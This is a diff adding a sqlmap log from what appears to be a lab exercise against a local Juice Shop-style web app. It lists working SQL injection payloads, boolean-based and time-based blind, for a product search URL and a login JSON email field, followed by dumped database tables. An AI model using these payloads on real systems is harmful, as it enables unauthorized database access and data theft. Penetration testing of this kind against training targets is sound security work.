@@ -1,0 +1,79 @@
+sqlmap identified the following injection point(s) with a total of 39 HTTP(s) requests:
+---
+Parameter: #1* (URI)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: http://localhost:3000/rest/products/search?q=') AND 7851=7851 AND ('ETcY' LIKE 'ETcY
+---
+back-end DBMS: SQLite
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: #1* (URI)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: http://localhost:3000/rest/products/search?q=') AND 7851=7851 AND ('ETcY' LIKE 'ETcY
+---
+back-end DBMS: SQLite
+sqlmap identified the following injection point(s) with a total of 228 HTTP(s) requests:
+---
+Parameter: JSON #1* ((custom) POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: {"email":"' OR NOT 1834=1834-- zQVp","password":"test"}
+
+    Type: time-based blind
+    Title: SQLite > 2.0 OR time-based blind (heavy query)
+    Payload: {"email":"' OR 6164=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))-- mxtx","password":"test"}
+---
+back-end DBMS: SQLite
+Database: <current>
+Table: Memories
+[10 entries]
++----+--------+------------------------------------------------------+--------------------------------+-----------------------------------------------------------------------------------------------------+--------------------------------+
+| id | UserId | caption                                              | createdAt                      | imagePath                                                                                           | updatedAt                      |
++----+--------+------------------------------------------------------+--------------------------------+-----------------------------------------------------------------------------------------------------+--------------------------------+
+| 1  | 13     | 😼 #zatschi #whoneedsfourlegs                        | 2026-03-08 19:49:42.309 +00:00 | assets/public/images/uploads/ᓚᘏᗢ-#zatschi-#whoneedsfourlegs-1572600969477.jpg                       | 2026-03-08 19:49:42.309 +00:00 |
+| 2  | 4      | Magn(et)ificent!                                     | 2026-03-08 19:49:42.309 +00:00 | assets/public/images/uploads/magn(et)ificent!-1571814229653.jpg                                     | 2026-03-08 19:49:42.309 +00:00 |
+| 3  | 4      | My rare collectors item! [̲̅$̲̅(̲̅ ͡° ͜ʖ ͡°̲̅)̲̅$̲̅] | 2026-03-08 19:49:42.309 +00:00 | assets/public/images/uploads/my-rare-collectors-item!-[̲̅$̲̅(̲̅-͡°-͜ʖ-͡°̲̅)̲̅$̲̅]-1572603645543.jpg | 2026-03-08 19:49:42.309 +00:00 |
+| 4  | 21     | Welcome to the Bee Haven (/#/bee-haven)🐝            | 2026-03-08 19:49:42.309 +00:00 | assets/public/images/uploads/BeeHaven.png                                                           | 2026-03-08 19:49:42.309 +00:00 |
+| 5  | 13     | Sorted the pieces, starting assembly process...      | 2026-03-08 19:49:42.309 +00:00 | assets/public/images/uploads/sorted-the-pieces,-starting-assembly-process-1721152307290.jpg         | 2026-03-08 19:49:42.309 +00:00 |
+| 6  | 13     | Building something literally bottom up...            | 2026-03-08 19:49:42.309 +00:00 | assets/public/images/uploads/building-something-literally-bottom-up-1721152342603.jpg               | 2026-03-08 19:49:42.309 +00:00 |
+| 7  | 13     | Putting in the hardware...                           | 2026-03-08 19:49:42.309 +00:00 | assets/public/images/uploads/putting-in-the-hardware-1721152366854.jpg                              | 2026-03-08 19:49:42.309 +00:00 |
+| 8  | 13     | Everything up and running!                           | 2026-03-08 19:49:42.309 +00:00 | assets/public/images/uploads/everything-up-and-running!-1721152385146.jpg                           | 2026-03-08 19:49:42.309 +00:00 |
+| 9  | 18     | I love going hiking here...                          | 2026-03-08 19:49:42.316 +00:00 | assets/public/images/uploads/favorite-hiking-place.png                                              | 2026-03-08 19:49:42.316 +00:00 |
+| 10 | 19     | My old workplace...                                  | 2026-03-08 19:49:42.318 +00:00 | assets/public/images/uploads/IMG_4253.jpg                                                           | 2026-03-08 19:49:42.318 +00:00 |
++----+--------+------------------------------------------------------+--------------------------------+-----------------------------------------------------------------------------------------------------+--------------------------------+
+
+Database: <current>
+Table: PrivacyRequests
+[0 entries]
++----+--------+-----------+-----------+-------------------+
+| id | UserId | createdAt | updatedAt | deletionRequested |
++----+--------+-----------+-----------+-------------------+
++----+--------+-----------+-----------+-------------------+
+
+Database: <current>
+Table: sqlite_sequence
+[17 entries]
++-----+-------------------+
+| seq | name              |
++-----+-------------------+
+| 14  | SecurityQuestions |
+| 22  | Users             |
+| 20  | SecurityAnswers   |
+| 6   | Addresses         |
+| 8   | Feedbacks         |
+| 6   | Cards             |
+| 110 | Challenges        |
+| 378 | Hints             |
+| 46  | Products          |
+| 5   | Baskets           |
+| 8   | BasketItems       |
+| 1   | Complaints        |
+| 9   | Recycles          |
+| 46  | Quantities        |
+| 22  | Wallets           |
+| 3   | Deliveries        |
+| 10  | Memories          |
++-----+-------------------+
+
